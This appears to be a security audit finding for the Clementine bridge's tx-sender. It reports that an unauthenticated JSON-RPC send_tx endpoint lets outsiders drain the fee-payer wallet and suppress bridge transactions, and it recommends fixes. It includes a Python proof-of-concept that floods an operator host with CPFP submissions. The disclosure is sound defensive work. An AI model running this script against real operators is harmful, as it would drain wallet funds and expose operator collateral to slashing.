### Title
Unauthenticated tx-sender JSON-RPC `send_tx` endpoint drains fee-payer wallet and can suppress bridge transactions — (`File: crates/clementine-tx-sender/src/jsonrpc/server.rs`)

### Summary

The tx-sender JSON-RPC server exposes a `send_tx` method with zero authentication. Any network-reachable caller can enqueue arbitrary Bitcoin transactions for broadcasting. The tx-sender will then spend its own wallet funds to create CPFP fee-payer UTXOs for every queued entry, draining tx-sender-managed balances. Because the gRPC layer uses mTLS but the JSON-RPC layer does not, the trust boundary is broken: the same `insert_try_to_send` path that the operator uses internally is reachable by an unauthenticated external party.

### Finding Description

**Root cause — no authentication on the JSON-RPC server**

`start_jsonrpc_server` builds a plain `jsonrpsee::Server` and registers `send_tx` with no interceptor, no token check, and no IP allowlist enforcement: [1](#0-0) 

The handler deserialises the caller-supplied raw transaction and calls `TxSenderClient::insert_try_to_send` directly, accepting the caller's choice of `fee_paying_type`, `cancel_outpoints`, `cancel_txids`, `activate_txids`, and `activate_outpoints` without any validation: [2](#0-1) 

**Contrast with the gRPC layer**

Every gRPC endpoint is wrapped in `InterceptedService` with the `OnlyAggregatorAndSelf` interceptor that enforces mTLS leaf-certificate pinning: [3](#0-2) 

The JSON-RPC server has no equivalent guard.

**Bind address can be `0.0.0.0`**

The config explicitly documents `0.0.0.0` as a valid bind address: [4](#0-3) 

The task loop parses the address and starts the server without restricting it to loopback: [5](#0-4) 

**Fee-payer wallet drain path**

When a CPFP transaction is queued and the existing fee-payer UTXOs are insufficient, `create_fee_payer_utxo` calls `send_to_address` on the Bitcoin node wallet, spending 2× the required fee from the tx-sender's own funds: [6](#0-5) 

An attacker who submits N transactions with `FeePayingType::CPFP` causes N separate `send_to_address` calls, each consuming wallet funds proportional to the current fee rate.

**No rate limiting on the JSON-RPC server**

The gRPC server applies `RateLimitLayer`: [7](#0-6) 

The JSON-RPC server applies only a 50 MB body-size cap and no request-rate limit.

**`cancel_outpoints` / `cancel_txids` injection**

`insert_try_to_send` stores caller-supplied `cancel_outpoints` and `cancel_txids` verbatim: [8](#0-7) 

The confirmation loop marks a queued bridge transaction as cancelled as soon as any of its registered cancel-outpoints is observed spent on-chain: [9](#0-8) 

An attacker who knows the txid of a legitimate bridge transaction (e.g. a `Kickoff` or `ChallengeTimeout` tx, which are observable on-chain) can submit a crafted entry whose `cancel_txids` list contains that txid. Once the legitimate transaction confirms, the attacker's entry is marked cancelled — but the attacker can re-submit immediately. More critically, the attacker can submit an entry whose own inputs spend attacker-controlled UTXOs and whose `cancel_outpoints` list contains the inputs of a not-yet-broadcast bridge transaction. If the attacker's transaction confirms first (spending those same outpoints), the bridge transaction's queue entry is suppressed.

### Impact Explanation

1. **Loss of tx-sender-managed balances**: The tx-sender wallet is drained through repeated CPFP fee-payer creation for attacker-submitted junk transactions. This is an explicit in-scope impact category.

2. **Bridge liveness failure / slashable operator collateral**: With the fee-payer wallet empty, legitimate bridge transactions (`ChallengeTimeout`, `AssertTimeout`, `Reimburse`, `ReadyToReimburse`) cannot be fee-bumped and may fail to confirm before their timelocks expire. Missed `ChallengeTimeout` allows a verifier to slash the operator's collateral. Missed `AssertTimeout` prevents the operator from recovering the burn connector. Both are in-scope slashable-exposure impacts.

3. **Queue suppression**: By injecting entries with crafted `cancel_outpoints` referencing bridge UTXO inputs, an attacker can cause the tx-sender to stop retrying a bridge transaction after those inputs are spent by any on-chain transaction, silently dropping it from the queue.

### Likelihood Explanation

- The JSON-RPC feature is production-grade (a separate published client crate `clementine-tx-sender-jsonrpc-client` exists).
- Binding to `0.0.0.0` is explicitly documented as a valid option.
- No credentials, certificates, or shared secrets are required to call `send_tx`.
- The attack requires only HTTP reachability to the JSON-RPC port and knowledge of the Bitcoin transaction format — both trivially achievable by any network-adjacent attacker.

### Recommendation

1. **Add authentication**: Require a shared secret (Bearer token or HMAC) on every JSON-RPC request, checked in a middleware layer before the handler runs.
2. **Restrict bind address**: Enforce `127.0.0.1` in code, not just in a comment; reject `0.0.0.0` unless an explicit override flag is set.
3. **Add rate limiting**: Apply the same `RateLimitLayer` used on the gRPC server.
4. **Validate submitted transactions**: Reject transactions whose inputs are not wallet-owned UTXOs or known bridge UTXOs; reject `cancel_outpoints`/`cancel_txids` that reference bridge-protocol outpoints not owned by the caller.
5. **Separate fee-payer wallet**: Use a dedicated, low-balance hot wallet for fee bumping so that draining it does not affect bridge operations.

### Proof of Concept

```python
import requests, json

# tx-sender JSON-RPC bound to 0.0.0.0:PORT
URL = "http://<operator-host>:<PORT>"

# Minimal valid Bitcoin transaction (spends attacker's own UTXO)
JUNK_TX_HEX = "<attacker_signed_tx_hex>"

# Submit 1000 CPFP entries to drain the fee-payer wallet
for _ in range(1000):
    payload = {
        "jsonrpc": "2.0",
        "method": "send_tx",
        "params": [{
            "signed_tx_hex": JUNK_TX_HEX,
            "fee_paying_type": "cpfp",
            "tx_metadata": None,
            "rbf_signing_info": None,
            "cancel_outpoints": [],
            "cancel_txids": [],
            "activate_txids": [],
            "activate_outpoints": []
        }],
        "id": 1
    }
    requests.post(URL, json=payload)

# Each iteration causes create_fee_payer_utxo -> send_to_address,
# spending 2x required_fee from the tx-sender wallet.
# After N iterations the wallet is empty; legitimate bridge
# transactions (ChallengeTimeout, Reimburse, etc.) can no longer
# be fee-bumped and miss their timelocks.
```

```rust
pub async fn start_jsonrpc_server(
    tx_sender_client: TxSenderClient,
    bind_addr: SocketAddr,
) -> Result<TxSenderJsonRpcServer, BridgeError> {
    let server: Server = ServerBuilder::default()
        .max_request_body_size(MAX_JSONRPC_REQUEST_BODY_SIZE)
        .build(bind_addr)
        .await
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    let local_addr = server
        .local_addr()
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    let mut module = RpcModule::new(tx_sender_client.clone());
    module
        .register_async_method("send_tx", |params, client, _| async move {
            let req: InsertTryToSendParams = params.one().map_err(jsonrpc_err)?;

            let raw_tx = hex::decode(&req.signed_tx_hex).map_err(jsonrpc_err)?;
            let signed_tx: Transaction = consensus::deserialize(&raw_tx).map_err(jsonrpc_err)?;

            let mut dbtx = client.db.begin_transaction().await.map_err(jsonrpc_err)?;

            let try_to_send_id = client
                .insert_try_to_send(
                    &mut dbtx,
                    req.tx_metadata,
                    &signed_tx,
                    req.fee_paying_type,
                    req.rbf_signing_info,
                    &req.cancel_outpoints,
                    &req.cancel_txids,
                    &req.activate_txids,
                    &req.activate_outpoints,
                )
                .await
                .map_err(jsonrpc_err)?;

            client
                .db
                .commit_transaction(dbtx)
                .await
                .map_err(jsonrpc_err)?;

            Ok::<u32, ErrorObjectOwned>(try_to_send_id)
        })
        .map_err(|e| BridgeError::Eyre(e.into()))?;
```

```rust
impl Interceptor for Interceptors {
    #[allow(clippy::result_large_err)]
    fn call(&mut self, req: Request<()>) -> Result<Request<()>, Status> {
        match self {
            Interceptors::OnlyAggregatorAndSelf {
                our_cert,
                aggregator_cert,
            } => only_aggregator_and_self(req, our_cert, aggregator_cert),
            Interceptors::Noop => Ok(req),
        }
    }
}

#[allow(clippy::result_large_err)]
fn only_aggregator_and_self(
    req: Request<()>,
    our_cert: &CertificateDer<'static>,
    aggregator_cert: &CertificateDer<'static>,
) -> Result<Request<()>, Status> {
    let Some(peer_certs) = req.peer_certs() else {
        if cfg!(test) {
            // Test mode, we don't need to verify peer certificates
            return Ok(req);
        } else {
            // If we're not in test mode, we need to check peer certificates
            return Err(Status::unauthenticated(
                "Failed to verify peer certificate, is TLS enabled?",
            ));
        }
    };

    // IMPORTANT: Only check the leaf (end-entity) certificate, which is always the first
    // certificate in the chain. The leaf is the only certificate whose private key the peer
    // proved possession of during the TLS handshake. Checking anywhere else in the chain
    // would allow identity spoofing: an attacker could include a pinned cert as an
    // intermediate in their chain without possessing its private key.
    let Some(leaf_cert) = peer_certs.first() else {
        return Err(Status::unauthenticated("Peer certificate chain is empty"));
    };

    if is_internal(&req) {
        if leaf_cert == our_cert {
            Ok(req)
        } else {
            Err(Status::unauthenticated(
                "Unauthorized call to internal method (not self)",
            ))
        }
    } else if leaf_cert == aggregator_cert || leaf_cert == our_cert {
        Ok(req)
    } else {
        Err(Status::unauthenticated(
            "Unauthorized call to method (not aggregator or self)",
        ))
    }
```

```rust
    async fn create_fee_payer_utxo(
        &self,
        bumped_id: u32,
        dbtx: Option<&mut TxSenderTransaction>,
        tx: &Transaction,
        fee_rate: FeeRateKvb,
        total_fee_payer_amount: Amount,
        fee_payer_utxos_len: usize,
    ) -> Result<()> {
        tracing::debug!(
            "Creating fee payer UTXO for txid {} with bump id {}",
            &tx.compute_txid().to_string(),
            bumped_id
        );
        let required_fee = Self::calculate_required_fee(
            tx.weight(),
            fee_payer_utxos_len + 1,
            fee_rate,
            FeePayingType::CPFP,
        )?;

        // Aggressively add 2x required fee to the total amount to account for sudden spikes
        // We won't actually use 2x fees, but the fee payer utxo will hold that much amount so that while fee payer utxo gets mined
        // if fees increase the utxo should still be sufficient to fund the tx with high probability
        // leftover fees will get sent back to wallet with a change output in fn create_child_tx
        let new_total_fee_needed = required_fee
            .checked_mul(2)
            .and_then(|fee| fee.checked_add(MIN_TAPROOT_AMOUNT));
        if new_total_fee_needed.is_none() {
            return Err(eyre!("Total fee needed is too large, required fee: {}, total fee payer amount: {}, fee rate: {}", required_fee, total_fee_payer_amount, fee_rate).into());
        }
        let new_fee_payer_amount =
            new_total_fee_needed.and_then(|fee| fee.checked_sub(total_fee_payer_amount));

        let new_fee_payer_amount = match new_fee_payer_amount {
            Some(fee) => fee,
            // if underflow, no new fee payer utxo is needed, log it anyway in case its a bug
            None => {
                tracing::debug!("create_fee_payer_utxo was called but no new fee payer utxo is needed for tx: {:?}, required fee: {}, total fee payer amount: {}, current fee rate: {}", tx, required_fee, total_fee_payer_amount, fee_rate);
                return Ok(());
            }
        };
```
